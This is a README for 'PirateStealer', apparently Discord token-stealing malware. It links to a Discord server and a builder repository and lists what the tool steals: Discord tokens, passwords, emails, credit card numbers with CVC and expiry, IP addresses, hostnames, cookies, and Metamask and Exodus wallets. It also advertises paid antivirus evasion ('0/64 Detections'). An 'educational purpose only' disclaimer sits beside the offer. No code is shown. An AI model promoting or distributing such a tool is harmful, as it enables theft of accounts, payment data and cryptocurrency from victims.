##### [🌍 Discord Server](https://discord.gg/FjsXUpZjgW) -  [:gem: Premium](https://discord.gg/FjsXUpZjgW) - [🔧 Builder](https://github.com/Stanley-GF/Arizona) - [💡 Features](https://github.com/Stanley-GF/Arizona#features) 

### Authors
- Stanley
- Bytixo

### Contributors
- Autist69420
- HideakiAtsuyo

# PirateStealer (by Brooklyn inc)
The new modern discord token grabber & token stealer, with discord password & token even when it changes

# Terms
- [x] Educational purpose only
- [x] Reselling is forbidden
- [ ] You can use the source code if you keep credits (in embed + in markdown), it has to be open-source
- [x] We are NOT responsible of anything you do with our software (if its illegal)

# Features
- QRCode logger 
- Discord Login Stealer
  - Username
  - ID
  - Token
  - Password (even when it changes)
  - Email
  - Badges
  - Nitro
  - Credit Card number
  - CVC
  - Expiration
  - Billing
- IP
- Computer Hostname
- Instantly logout
- Disable QR
- Custom embed
- Cool code structure
- Cookies (💎)
- Password (💎)
- Cookie Automatic Logger (💎)
- Metamask stealer (💎)
- Exodus stealer (💎)
- Anti-Delete & Anti-Spam (💎)
- 0/64 Detections (💎)
